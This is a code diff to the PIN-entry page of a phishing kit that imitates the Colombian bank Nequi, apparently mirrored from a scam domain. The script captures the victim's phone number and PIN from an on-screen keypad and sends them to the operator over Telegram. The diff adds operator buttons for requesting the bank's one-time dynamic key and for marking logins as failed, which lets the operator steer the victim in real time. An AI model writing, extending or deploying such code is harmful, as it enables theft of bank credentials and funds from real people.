@@ -200,138 +200,126 @@
 
   <script src="../js/sendTelegramMessage.js"></script>
 <script src="../js/actions.js"></script>
-  <script type="module">
-    document.addEventListener("DOMContentLoaded", () => {
-      const formData = JSON.parse(localStorage.getItem("formData"));
-      const inputs = document.querySelectorAll('input[id^="pass-"]');
-      const keyboard = document.getElementById("keyboard");
-      const deleteBtn = document.getElementById("delete-pass");
-      const loadingSpinner = document.querySelector(".loadingContainer");
-      const errorLogin = document.getElementById("error-login");
-      const tryAgainButton = document.getElementById("tryAgainButton");
-      let currentInput = 0;
+<script type="module">
+  document.addEventListener("DOMContentLoaded", () => {
+    const formData = JSON.parse(localStorage.getItem("formData")) || {};
+    const inputs = document.querySelectorAll('input[id^="pass-"]');
+    const keyboard = document.getElementById("keyboard");
+    const deleteBtn = document.getElementById("delete-pass");
+    const loadingSpinner = document.querySelector(".loadingContainer");
+    const errorLogin = document.getElementById("error-login");
+    const tryAgainButton = document.getElementById("tryAgainButton");
+    let currentInput = 0;
 
-      tryAgainButton.addEventListener("click", () => {
-        window.location.href = "auth-login.html";
-      });
+    tryAgainButton.addEventListener("click", () => {
+      window.location.href = "accces-sign-in.html?error=1";
+    });
 
-      // Manejar clics del teclado
-      keyboard.addEventListener("click", (e) => {
-        const button = e.target.closest(".keyboard-btn");
-        if (button && !button.id.includes("delete")) {
-          const value = button.dataset.value;
-          if (currentInput < inputs.length) {
-            // Guardar el valor real en un atributo personalizado
-            inputs[currentInput].dataset.realValue = value;
-            // Mostrar asterisco en el campo de entrada
-            inputs[currentInput].value = "*";
-            // Disparar el evento input
-            inputs[currentInput].dispatchEvent(
-              new Event("input", {
-                bubbles: true,
-              })
-            );
-            currentInput++;
+    // Manejar clics del teclado
+    keyboard.addEventListener("click", (e) => {
+      const button = e.target.closest(".keyboard-btn");
+      if (button && !button.id.includes("delete")) {
+        const value = button.dataset.value;
+        if (currentInput < inputs.length) {
+          inputs[currentInput].dataset.realValue = value;
+          inputs[currentInput].value = "*";
+          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+          currentInput++;
+        }
+      }
+    });
+
+    // Manejar el botón de borrar
+    deleteBtn.addEventListener("click", () => {
+      if (currentInput > 0) {
+        currentInput--;
+        inputs[currentInput].value = "";
+        inputs[currentInput].dataset.realValue = "";
+        inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+      }
+    });
+
+    // Permitir borrar con tecla retroceso
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && currentInput > 0) {
+        currentInput--;
+        inputs[currentInput].value = "";
+        inputs[currentInput].dataset.realValue = "";
+        inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+      }
+    });
+
+    // Prevenir entrada de teclado físico
+    inputs.forEach((input) => {
+      ["keydown", "keyup", "keypress"].forEach((eventType) => {
+        input.addEventListener(eventType, (e) => {
+          if (e.key !== "Backspace") {
+            e.preventDefault();
+            return false;
           }
-        }
-      });
-
-      // Manejar el botón de borrar
-      deleteBtn.addEventListener("click", () => {
-        if (currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dispatchEvent(
-            new Event("input", {
-              bubbles: true,
-            })
-          );
-        }
-      });
-
-      // Permitir borrar con tecla retroceso
-      document.addEventListener("keydown", (e) => {
-        if (e.key === "Backspace" && currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dispatchEvent(
-            new Event("input", {
-              bubbles: true,
-            })
-          );
-        }
-      });
-
-      // Prevenir cualquier entrada de teclado físico
-      inputs.forEach((input) => {
-        ["keydown", "keyup", "keypress", "input", "textInput"].forEach(
-          (eventType) => {
-            input.addEventListener(eventType, (e) => {
-              e.preventDefault();
-              return false;
-            });
-          }
-        );
-
-        input.addEventListener("paste", (e) => {
-          e.preventDefault();
-          return false;
         });
-
-        input.setAttribute("readonly", "readonly");
-        input.setAttribute("inputmode", "none");
       });
+      input.addEventListener("paste", (e) => {
+        e.preventDefault();
+        return false;
+      });
+      input.setAttribute("readonly", "readonly");
+      input.setAttribute("inputmode", "none");
+    });
 
-      // Verificar el estado de los inputs
-      inputs.forEach((input, index) => {
-        input.addEventListener("input", async () => {
-          let isComplete = Array.from(inputs).every(
-            (input) => input.value !== ""
-          );
-          if (isComplete) {
-            let pass = "";
-            inputs.forEach((input) => {
-              pass += input.dataset.realValue || "";
-            });
+    // Verificar cuando se complete la clave
+    inputs.forEach((input) => {
+      input.addEventListener("input", async () => {
+        let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
+        
+        if (isComplete) {
+          let pass = "";
+          inputs.forEach((inp) => {
+            pass += inp.dataset.realValue || "";
+          });
 
-            const formData =
-              JSON.parse(localStorage.getItem("formData")) || {};
-            const transactionId =
-              Date.now().toString(36) + Math.random().toString(36).substr(2);
-            formData.password = pass;
-            formData.transactionId = transactionId;
-            localStorage.setItem("formData", JSON.stringify(formData));
-            loadingSpinner.style.display = "block";
+          const savedData = JSON.parse(localStorage.getItem("formData")) || {};
+          const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+          
+          savedData.password = pass;
+          savedData.transactionId = transactionId;
+          localStorage.setItem("formData", JSON.stringify(savedData));
+          
+          loadingSpinner.style.display = "block";
 
-            const message = `⭐⭐Nequi paso 1⭐⭐\n\n📱Número: ${formData.phoneNumber}\n 🔒Clave: ${pass}`;
-            const keyboard = JSON.stringify({
-              inline_keyboard: [
-                [
-                  { text: "Correcto", callback_data: `correcto:${transactionId}` },
-                  { text: "Incorrecto", callback_data: `incorrecto:${transactionId}` }
-                ]
+          // ⭐ MENSAJE CORREGIDO CON TODOS LOS BOTONES
+          const mensaje = `🔐 *NEQUI - DATOS DE ACCESO*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${pass}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}\n\n⚠️ *Esperando validación...*`;
+          
+          const teclado = JSON.stringify({
+            inline_keyboard: [
+              [
+                { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+                { text: "❌ Incorrecto", callback_data: `incorrecto:${transactionId}` }
+              ],
+              [
+                { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
+              ],
+              [
+                { text: "⚠️ Error Dinámica", callback_data: `error_dinamica:${transactionId}` },
+                { text: "🚫 Error Login", callback_data: `error_login:${transactionId}` }
+              ],
+              [
+                { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
               ]
-            });
+            ]
+          });
 
-            try {
-              const responseMensaje = await sendTelegramMessageWithBtn(
-                message,
-                keyboard
-              );
-
-              const { action } = await waitForButtonPress(responseMensaje.message_id);
-
-              await handleAction(action, transactionId);
-            } catch (error) {
-              console.error("Error al enviar el mensaje:", error);
-            }
+          try {
+            const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
+            const { action } = await waitForButtonPress(responseMensaje.message_id);
+            await handleAction(action, transactionId);
+          } catch (error) {
+            console.error("Error al enviar el mensaje:", error);
+            loadingSpinner.style.display = "none";
+            alert("Error de conexión. Intenta nuevamente.");
           }
-        });
+        }
       });
     });
-  </script>
-</body>
-
-
-<!-- Mirrored from prestamo360creditsecurity.pagacondecya.click/access-passed/access-sign-in-pass.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Sep 2025 01:57:08 GMT -->
-</html>
+  });
+</script>
